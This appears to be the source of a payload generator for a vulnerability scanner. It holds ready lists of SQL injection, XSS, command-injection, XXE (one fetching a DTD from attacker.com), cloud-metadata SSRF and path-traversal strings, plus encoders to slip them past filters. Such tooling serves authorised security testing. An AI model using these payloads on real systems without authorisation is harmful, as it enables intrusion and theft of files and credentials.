#!/usr/bin/env python3
"""
Dynamic Payload Generator for BugHunter Pro
Generates vulnerability payloads based on CVE data and patterns
"""

import sqlite3
import logging
import json
import random
from typing import List, Dict, Optional, Any
from dataclasses import dataclass
from urllib.parse import quote, quote_plus
import base64

logger = logging.getLogger(__name__)


@dataclass
class Payload:
    """Payload data structure"""
    vuln_type: str
    payload: str
    description: str
    encoding: str = "none"
    cve_id: Optional[str] = None
    effectiveness_score: float = 0.0


class PayloadGenerator:
    """Dynamic payload generation from CVE database and patterns"""
    
    def __init__(self, database_path: str = "database/cve_database.db"):
        """
        Initialize Payload Generator
        
        Args:
            database_path: Path to SQLite database
        """
        self.database_path = database_path
        
        # Payload templates by vulnerability type
        self.templates = self._load_templates()
        
        logger.info("Payload Generator initialized")
    
    def _load_templates(self) -> Dict[str, List[str]]:
        """Load payload templates"""
        return {
            'sql_injection': [
                "' OR '1'='1",
                "' OR 1=1--",
                "\" OR \"1\"=\"1",
                "' UNION SELECT NULL--",
                "1' AND 1=1--",
                "' OR 'x'='x",
                "admin' --",
                "') OR ('1'='1",
                "' WAITFOR DELAY '00:00:05'--",
                "1' AND SLEEP(5)--",
            ],
            'xss': [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "<iframe src=javascript:alert(1)>",
                "'><script>alert(1)</script>",
                "\"><script>alert(1)</script>",
                "<body onload=alert(1)>",
                "<input onfocus=alert(1) autofocus>",
                "<marquee onstart=alert(1)>",
            ],
            'command_injection': [
                "; ls -la",
                "| whoami",
                "& dir",
                "`id`",
                "$(whoami)",
                "; cat /etc/passwd",
                "| type C:\\\\Windows\\\\win.ini",
                "&& ping -c 5 127.0.0.1",
                "; sleep 5",
                "| timeout 5",
            ],
            'xxe': [
                "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
                "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///c:/windows/win.ini\">]><data>&file;</data>",
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"http://attacker.com/evil.dtd\" >]><foo>&xxe;</foo>",
            ],
            'ssrf': [
                "http://127.0.0.1",
                "http://localhost",
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "file:///etc/passwd",
                "file:///c:/windows/win.ini",
            ],
            'lfi': [
                "../../../etc/passwd",
                "..\\\\..\\\\..\\\\windows\\\\win.ini",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
            ]
        }
    
    def generate_payloads(
        self,
        vuln_type: str,
        count: int = 10,
        encode: bool = True
    ) -> List[Payload]:
        """
        Generate payloads for a vulnerability type
        
        Args:
            vuln_type: Vulnerability type
            count: Number of payloads to generate
            encode: Include encoded variants
        
        Returns:
            List of Payload objects
        """
        payloads = []
        base_payloads = self.templates.get(vuln_type, [])
        
        if not base_payloads:
            logger.warning(f"No templates for {vuln_type}")
            return payloads
        
        # Select random base payloads
        selected = random.sample(base_payloads, min(count, len(base_payloads)))
        
        for payload_str in selected:
            # Add base payload
            payloads.append(Payload(
                vuln_type=vuln_type,
                payload=payload_str,
                description=f"Base {vuln_type} payload",
                encoding="none"
            ))
            
            # Add encoded variants if requested
            if encode:
                # URL encoded
                payloads.append(Payload(
                    vuln_type=vuln_type,
                    payload=quote(payload_str),
                    description=f"URL encoded {vuln_type}",
                    encoding="url"
                ))
                
                # Double URL encoded
                payloads.append(Payload(
                    vuln_type=vuln_type,
                    payload=quote(quote(payload_str)),
                    description=f"Double URL encoded {vuln_type}",
                    encoding="double_url"
                ))
                
                # Base64 (for some types)
                if vuln_type in ['command_injection', 'xxe']:
                    b64_payload = base64.b64encode(payload_str.encode()).decode()
                    payloads.append(Payload(
                        vuln_type=vuln_type,
                        payload=b64_payload,
                        description=f"Base64 encoded {vuln_type}",
                        encoding="base64"
                    ))
        
        return payloads[:count]
    
    def generate_from_cve(self, cve_id: str) -> List[Payload]:
        """
        Generate payloads based on CVE data
        
        Args:
            cve_id: CVE identifier
        
        Returns:
            List of generated payloads
        """
        payloads = []
        
        try:
            conn = sqlite3.connect(self.database_path)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            # Get CVE data
            cursor.execute("SELECT * FROM cves WHERE cve_id = ?", (cve_id,))
            cve = cursor.fetchone()
            
            if not cve:
                logger.warning(f"CVE not found: {cve_id}")
                conn.close()
                return payloads
            
            # Determine vulnerability type from CWE
            cwe_id = cve['cwe_id']
            vuln_type = self._map_cwe_to_vuln_type(cwe_id)
            
            # Get exploit data if available
            cursor.execute("""
                SELECT * FROM exploits 
                WHERE cve_id = ? 
                LIMIT 5
            """, (cve_id,))
            
            exploits = cursor.fetchall()
            conn.close()
            
            # Generate base payloads for the vulnerability type
            if vuln_type:
                base_payloads = self.generate_payloads(vuln_type, count=5)
                
                for p in base_payloads:
                    p.cve_id = cve_id
                    p.description = f"{vuln_type} payload for {cve_id}"
                    payloads.append(p)
            
            # If we have exploits, extract patterns
            for exploit in exploits:
                # This is simplified - in reality, would parse exploit code
                pattern_payloads = self._extract_patterns_from_exploit(
                    exploit['title'],
                    exploit.get('description', ''),
                    cve_id
                )
                payloads.extend(pattern_payloads)
            
            logger.info(f"Generated {len(payloads)} payloads for {cve_id}")
            return payloads
        
        except Exception as e:
            logger.error(f"Failed to generate payloads for {cve_id}: {e}")
            return []
    
    def _map_cwe_to_vuln_type(self, cwe_id: Optional[str]) -> Optional[str]:
        """Map CWE ID to vulnerability type"""
        if not cwe_id:
            return None
        
        cwe_mapping = {
            'CWE-89': 'sql_injection',
            'CWE-79': 'xss',
            'CWE-78': 'command_injection',
            'CWE-77': 'command_injection',
            'CWE-611': 'xxe',
            'CWE-918': 'ssrf',
            'CWE-22': 'lfi',
            'CWE-98': 'lfi',
        }
        
        return cwe_mapping.get(cwe_id)
    
    def _extract_patterns_from_exploit(
        self,
        title: str,
        description: str,
        cve_id: str
    ) -> List[Payload]:
        """Extract payload patterns from exploit text"""
        payloads = []
        
        # Simple pattern extraction (could be enhanced with NLP)
        text = f"{title} {description}".lower()
        
        # Look for common patterns
        if 'sql' in text or 'injection' in text:
            payload = Payload(
                vuln_type='sql_injection',
                payload="' OR '1'='1",
                description=f"Pattern extracted from {cve_id}",
                cve_id=cve_id
            )
            payloads.append(payload)
        
        if 'xss' in text or 'script' in text:
            payload = Payload(
                vuln_type='xss',
                payload="<script>alert(1)</script>",
                description=f"Pattern extracted from {cve_id}",
                cve_id=cve_id
            )
            payloads.append(payload)
        
        return payloads
    
    def store_payload(self, payload: Payload) -> bool:
        """
        Store payload in database
        
        Args:
            payload: Payload object to store
        
        Returns:
            True if successful
        """
        try:
            conn = sqlite3.connect(self.database_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO payloads (
                    vuln_type, payload, description, encoding,
                    cve_id, effectiveness_score, usage_count,
                    created_at
                ) VALUES (?, ?, ?, ?, ?, ?, 0, CURRENT_TIMESTAMP)
            ''', (
                payload.vuln_type,
                payload.payload,
                payload.description,
                payload.encoding,
                payload.cve_id,
                payload.effectiveness_score
            ))
            
            conn.commit()
            conn.close()
            
            return True
        
        except Exception as e:
            logger.debug(f"Failed to store payload: {e}")
            return False
    
    def get_top_payloads(
        self,
        vuln_type: str,
        limit: int = 10
    ) -> List[Dict[str, Any]]:
        """
        Get top-performing payloads
        
        Args:
            vuln_type: Vulnerability type
            limit: Maximum results
        
        Returns:
            List of payload records
        """
        try:
            conn = sqlite3.connect(self.database_path)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            cursor.execute('''
                SELECT * FROM payloads
                WHERE vuln_type = ?
                ORDER BY effectiveness_score DESC, usage_count DESC
                LIMIT ?
            ''', (vuln_type, limit))
            
            results = [dict(row) for row in cursor.fetchall()]
            conn.close()
            
            return results
        
        except Exception as e:
            logger.error(f"Failed to get payloads: {e}")
            return []
    
    def update_payload_stats(
        self,
        payload_id: int,
        success: bool
    ):
        """
        Update payload effectiveness statistics
        
        Args:
            payload_id: Payload ID
            success: Whether the payload was successful
        """
        try:
            conn = sqlite3.connect(self.database_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                UPDATE payloads
                SET usage_count = usage_count + 1,
                    success_count = success_count + ?,
                    effectiveness_score = CAST(success_count AS REAL) / CAST(usage_count AS REAL)
                WHERE id = ?
            ''', (1 if success else 0, payload_id))
            
            conn.commit()
            conn.close()
        
        except Exception as e:
            logger.error(f"Failed to update payload stats: {e}")


if __name__ == "__main__":
    # Example usage
    logging.basicConfig(level=logging.INFO)
    
    print("\n" + "="*70)
    print("Payload Generator Demo")
    print("="*70)
    
    # Initialize generator
    generator = PayloadGenerator()
    
    # Generate SQL injection payloads
    print("\n🎯 Generating SQL Injection payloads...")
    sqli_payloads = generator.generate_payloads('sql_injection', count=5, encode=True)
    
    print(f"\nGenerated {len(sqli_payloads)} SQL injection payloads:")
    for i, p in enumerate(sqli_payloads[:10], 1):
        print(f"\n  {i}. Type: {p.vuln_type}")
        print(f"     Encoding: {p.encoding}")
        print(f"     Payload: {p.payload[:60]}...")
    
    # Generate XSS payloads
    print("\n\n🎯 Generating XSS payloads...")
    xss_payloads = generator.generate_payloads('xss', count=5, encode=True)
    
    print(f"\nGenerated {len(xss_payloads)} XSS payloads:")
    for i, p in enumerate(xss_payloads[:10], 1):
        print(f"\n  {i}. Encoding: {p.encoding}")
        print(f"     Payload: {p.payload[:60]}...")
    
    # Store payloads in database
    print("\n\n💾 Storing payloads in database...")
    stored = 0
    for payload in sqli_payloads + xss_payloads:
        if generator.store_payload(payload):
            stored += 1
    
    print(f"✅ Stored {stored} payloads")
    
    # Get top payloads
    print("\n📊 Top SQL Injection payloads:")
    top_sqli = generator.get_top_payloads('sql_injection', limit=5)
    
    for payload in top_sqli:
        print(f"\n  Payload: {payload['payload'][:50]}...")
        print(f"  Usage: {payload['usage_count']} times")
        print(f"  Effectiveness: {payload['effectiveness_score']:.2%}")
